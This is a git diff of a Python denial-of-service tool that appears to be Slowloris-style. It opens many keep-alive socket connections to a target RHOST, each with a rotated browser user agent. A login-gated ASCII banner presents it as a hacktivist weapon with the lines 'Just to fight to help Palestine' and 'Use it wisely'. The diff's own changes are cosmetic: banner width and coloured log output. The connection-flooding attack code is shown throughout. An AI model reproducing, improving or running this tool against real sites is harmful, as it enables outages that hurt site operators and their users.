@@ -22,14 +22,14 @@ print("""
 ▒║ ╔═════╗ ║▒║ ╚═════╝ ║▒║ ║▒▒▒▒║ ║▒▒║ ╚════╗▒▒▒║ ║▒▒▒▒▒▒║        ║▒
 ▒║ ║▒▒▒▒▒║ ║▒║         ║▒║ ║▒▒▒▒║ ║▒▒║      ║▒▒▒║ ║▒▒▒▒▒▒╚╗      ╔╝▒
 ▒║ ╚═════╝ ║▒║ ╔═════╗ ║▒║ ╚════╝ ║▒▒║ ╔════╝▒▒▒║ ╚═════╗▒╚═╗  ╔═╝▒▒
-▒╚╗        ║▒║ ║▒▒▒▒▒║ ║▒║       ╔╝▒▒║ ║▒▒▒▒▒▒▒▒║       ║▒▒▒║  ║▒▒▒▒
-▒▒╚═══════╝▒▒╚═╝▒▒▒▒▒╚═╝▒╚═══════╝▒▒▒╚═╝▒▒▒▒▒▒▒▒╚═══════╝▒▒▒╚══╝▒▒▒
+▒╚╗        ║▒║ ║▒▒▒▒▒║ ║▒║       ╔╝▒▒║ ║▒▒▒▒▒▒▒▒║       ║▒▒▒║  ║▒▒▒▒▒
+▒▒╚═══════╝▒▒╚═╝▒▒▒▒▒╚═╝▒╚═══════╝▒▒▒╚═╝▒▒▒▒▒▒▒▒╚═══════╝▒▒▒╚══╝▒▒
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
-print(f"\033[97m╔{'═' * 71}╗")
-print(f"\033[97m║\033[104m{' ' * 21}Don't attack government sites{' ' * 18}\033[0m║")
+print(f"\033[97m╔{'═' * 67}╗")
+print(f"\033[97m║\033[104m{' ' * 21}Don't attack government sites{' ' * 17}\033[0m║")
 print(f"\033[97m║\033[104m{' ' * 20}Just to fight to help Palestine{' ' * 16}\033[0m║")
 print(f"\033[97m║\033[104m{' ' * 28}_Use it wisely_{' ' * 24}\033[0m║")
-print(f"\033[97m╚{'═' * 71}╝")
+print(f"\033[97m╚{'═' * 67}╝")
 while attemps < 100:
     print("\033[38;5;6m┏━━KunFayz━━⬣")
     username = input("\033[38;5;6m┗> Enter Username: \033[30m")
@@ -59,7 +59,7 @@ if not args.RHOST:
     sys.exit(1)
 
 
-logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%H:%M:%S", level=(logging.DEBUG if args.verbose else logging.INFO))
+logging.basicConfig(format="\033[48;5;6m[%(asctime)s] %(message)s", datefmt="%H:%M:%S", level=(logging.DEBUG if args.verbose else logging.INFO))
 
 user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
@@ -117,11 +117,6 @@ def init_attack(nAttackers):
     s.send("Connection: keep-alive\r\n".encode())
     logging.debug("Creating attacker | ID: {}".format(identifier))
     return attacker(identifier, agent, s)
-
-def main():
-    logging.info("\033[38;5;220mGet \033[36m{} \033[37mResponse: \033[33m{}\033[0m".format(host, connections)) 
-    logging.info("Establishing connections..")
-    attackers = []
 
     for x in range((connections)):
         try:
